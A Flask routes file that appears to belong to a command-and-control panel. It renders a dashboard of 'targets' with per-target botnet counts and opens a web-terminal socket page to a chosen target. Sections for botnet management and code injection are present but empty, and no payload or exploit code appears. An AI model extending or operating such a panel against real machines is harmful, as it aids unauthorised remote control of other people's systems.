# -*- coding: utf-8 -*-
"""
view.py
This module defines the routes and views for the web application.
It handles user authentication, dashboard rendering, and socket connections for web terminals.
It uses Flask for web framework, SQLAlchemy for database interactions, and Bcrypt for password hashing
and verification.

Routes:
    - '/dashboard' : Dashboard page for logged-in users, displaying targets and connection types.
    - '/socket/<target_name>' : Socket page for a specific target, requires authentication.
"""

import traceback
import bcrypt
from flask import render_template, url_for, Blueprint, request, session, flash, redirect, jsonify
from sqlalchemy.orm import sessionmaker
from urllib.parse import unquote

from db.modle import Users, APICommand, APILink, Targets, Instraction, ApiToken, Instruction_Detail, BotNet
from db.mange_db import config, _create_engine
from utility.email_temp import EmailTemplate
from utility.processer import log, getlist, readFromJson, delete_data


Session = sessionmaker(bind=_create_engine())
_session = Session()

view = Blueprint("view", __name__, template_folder="templates")


@view.route("/dashboard")
def dashboard():
    """
    Render the dashboard page for the logged-in user.
    Displays targets associated with the user's email.
    Redirects to login if the user is not authenticated.
    """
    if "email" in session:
        try:
            email = session['email']
            print(email)
            targets = getlist(_session.query(Targets).filter_by(user_email=session['email']).all(), sp=',')
            botnet_per_targert = {}
            _targets = [] #list of (target_info, conn_type, target_name)
            for target in targets:
                target_ = readFromJson('target-info',target[1])
                print(target_)
                botnet_info = _session.query(BotNet).filter_by(target_name=target[1]).all()
                botnet_per_targert[target[1]] = (len(botnet_info), botnet_info)
                if '127.0.0.1' in target_['ip']:
                    conn = 'local'
                elif '192.168' in target_['ip']:
                    conn = 'wifi'
                else:
                    # , mdi mdi-ethernet-cable
                    conn = 'ethernet'
                _targets.append((target_, conn, target[1]))

            if request.method != 'GET':
                return redirect(url_for('event.page_404'))
            return render_template('auth/dashboard.html', targets=_targets,botnet_per_targert=botnet_per_targert)
        except Exception as e:
            log(f'[ERROR ROUT] : {request.endpoint} error: {e}\n{traceback.format_exc()}')
            print(traceback.format_exc())
            _session.rollback()
            return redirect(url_for('event.page_500'))
        finally:
            _session.close()
    else:
        flash("you must login first")
        return redirect(url_for("public.login"))


# -------------------------------------web terminal-------------------------------------
    
# -------------------------------------------------------------------------------

@view.route("/socket/<target_name>")
def socket_page(target_name):
    """
    Render the socket page for a specific target.
    Redirects to login if the user is not authenticated.
    """
    if "email" in session:
        try:
            token = getlist(_session.query(ApiToken).filter_by(user_email=session['email']).all(), sp=',')[0][1]
            targets = getlist(_session.query(Targets).filter_by(target_name=target_name).all(), sp=',')
            if len(targets) != 0 and len(token) != 0:
                return render_template('auth/socket.html', target_name=target_name,token=token)
            else:
                flash(f'No such a target {target_name}')
                return redirect(request.referrer)
        except Exception as e:
            log(f'[ERROR ROUT] : {request.endpoint} error: {e}\n{traceback.format_exc()}')
            _session.rollback()
            return redirect(url_for('event.page_500'))
        finally:
            _session.close()
    else:
        flash("you must login first")
        return redirect(url_for("public.login"))


# -----------------------------------botNet management-----------------------------------
    
#----------------------------------------------------------------------------------------


#------------------------------code injection--------------------------------------------

#----------------------------------------------------------------------------------------

# --------------------------------------Setting------------------------------------------

#----------------------------------------------------------------------------------------
# -*- coding: utf-8 -*-
